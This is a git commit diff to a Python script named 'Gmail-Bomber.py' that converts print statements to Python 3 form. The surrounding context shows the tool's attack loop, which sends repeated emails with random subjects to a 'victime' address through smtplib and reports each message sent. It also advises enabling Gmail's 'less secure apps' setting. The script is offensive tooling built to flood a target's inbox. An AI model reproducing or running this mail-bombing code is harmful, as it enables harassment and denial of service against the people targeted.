69faa476c40906a5dbaf0180456ffc4a2f85b820
lamani hani <lamanihani1@gmail.com>
2018-03-26 08:32:27 +0000

    Update Gmail-Bomber.py

--- Gmail-Bomber.py
+++ Gmail-Bomber.py
@@ -66,20 +66,20 @@ try:
         subject = os.urandom(9)
         msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
         server.sendmail(user,victime,msg)
-        print "\033[94m[✔]\033[97m Email \033[92mSENT\033[97m  :\033[93m %i" % i
+        print ("\033[94m[✔]\033[97m Email \033[92mSENT\033[97m  :\033[93m %i") % i
         sys.stdout.flush()
     server.quit()
-    print '\033[93m[✔]\033[97m All \033[97mMessage was\033[92m sent\033[97m '
+    print ('\033[93m[✔]\033[97m All \033[97mMessage was\033[92m sent\033[97m ')
     
     
 except KeyboardInterrupt:
-    print '[✘] Canceled'
+    print ('[✘] Canceled')
     sys.exit()
 except smtplib.SMTPAuthenticationError:
     print(" ")
     print("\033[94m[✘] \033[91mError \033[97m:")
-    print '\033[94m[✘] \033[97mThe \033[93musername \033[97mor \033[93mpassword \033[97myou entered is incorrect.'
-    print "\033[94m[!] \033[97mCheck if the Options of 'Applications are less secure' is enabled "
+    print ('\033[94m[✘] \033[97mThe \033[93musername \033[97mor \033[93mpassword \033[97myou entered is incorrect.')
+    print ("\033[94m[!] \033[97mCheck if the Options of 'Applications are less secure' is enabled ")
     sys.exit()
 
 
